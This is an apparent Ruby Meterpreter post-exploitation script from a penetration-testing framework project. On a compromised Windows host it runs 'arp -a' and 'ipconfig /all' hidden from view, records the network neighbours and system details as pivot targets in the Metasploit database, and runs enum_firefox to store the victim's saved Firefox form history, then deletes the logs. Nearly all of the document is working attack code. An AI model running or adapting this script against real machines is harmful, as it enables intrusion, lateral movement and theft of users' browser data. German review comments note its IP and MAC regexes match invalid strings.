require 'pp'

#dmke:
# Weitere Kleinigkeiten:
# * Zeile 20 match auch auf 999.999.999.999
# * Zeile 22 würde auch "xj-z-?.-@3-..." matchen "\S = nicht Whitespace"

$pivot

# Function for running arp -a on the owned host
def get_arp_a_infos
  hosts = Array.new
  cmd = 'arp -a'
  r, cmdout = '', ''  
  r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
  while d = r.channel.read
    cmdout << d
  end 
  cmdout.split("\n").each do |line|
    # extract ip-adresses
    ip = line.scan /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/
    # extract MAC-adresses
    mac = line.scan /\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}/
    # write found ip- and mac adress in database           
    if not ip.empty? and not mac.empty?
      mac = mac.first.to_s.gsub('-',':')
      aHost = Hash.new
      aHost[:workspace] = session.framework.db.workspace
      aHost[:host] =  ip.first.to_s
      aHost[:mac] =  mac 
      if $pivot[:host]  != ip.first.to_s
        aHost[:pivot_host_id] = $pivot[:id] 
      end
      hosts << aHost
    end
  end
  r.channel.close
  r.close
  return hosts
end

# Function for running ipconfig -all on the owned host
def get_host_infos
  hostdata = Hash.new
  hostdata[:workspace] = session.framework.db.workspace
  r, cmdout = '', '' 
  r = @client.sys.process.execute('ipconfig /all', nil, {'Hidden' => true, 'Channelized' => true})
  while d = r.channel.read
    cmdout << d
  end 
    
  ips = Array.new
  macs = Array.new
  
  cmdout.split("\n").each do |line|
    # extract ip-adresses
    ip = (line.scan /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)
    if ip[0] != nil
      ips << ip
    end
    # extract MAC-adresses
    mac = (line.scan /\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}/)
    if mac[0] != nil
      mac[0] = mac[0].gsub('-',':')
      macs << mac
    end 
  end
  # write all information about the host in the database
  sysinfo = client.sys.config.sysinfo
  
  hostdata[:os_name]   = (sysinfo['OS'].split'(')[0].strip
  hostdata[:os_flavor] = ((sysinfo['OS'].split'(')[1].split',')[0].strip  
  hostdata[:host]      = ips[0][0]
  hostdata[:host]
  $pivot = session.framework.db.get_host(hostdata)
  hostdata[:mac]       = macs[0][0]
  hostdata[:os_sp]     = (((sysinfo['OS'].split'(')[1].split',')[1].split')')[0].strip
  hostdata[:name]      = sysinfo['Computer']
  hostdata[:arch]      = sysinfo['Architecture']
  hostdata[:os_lang]   = sysinfo['System Language']
   
  return hostdata
end

def write_db host
  if session.framework.db.active
    session.framework.db.report_host host
  end
end

#todo "run enum_firefox"
def save_frfx_forms hostID, newRun = false, clear = false
  
  if newRun 
    client.run_cmd("run enum_firefox") #works only local
  end
  props =   YAML.load_file( '/home/nox/dev/fidius2/candc/config/msf.yml' )
  frfxLogPath = "/home/" + props['def_user'] + "/.msf3/logs/scripts/enum_firefox/"
  arr = Array.new
  Dir.foreach(frfxLogPath) { |x| 
    arr << x
  }
  if arr.size == 0
    puts "save_frfx_forms abborted, coz no frfx-log-dir was found."
    return;
  end
 
  frfxLogDir =  frfxLogPath + arr.sort.last 
  
  File.open(frfxLogDir + "/main_form_history.txt") do |file|
    file.each do |line|
      lineArray = line.split
      FrfxForm.new(:host_id=>hostID,:form_name=>lineArray[1],:value=>lineArray[3]).save # insert into ...
    end
  end
  if clear 
    system 'rm -r ' + frfxLogDir
  end
end  

write_db get_host_infos

get_arp_a_infos.each do |host|
  write_db host
end

save_frfx_forms $pivot[:id]
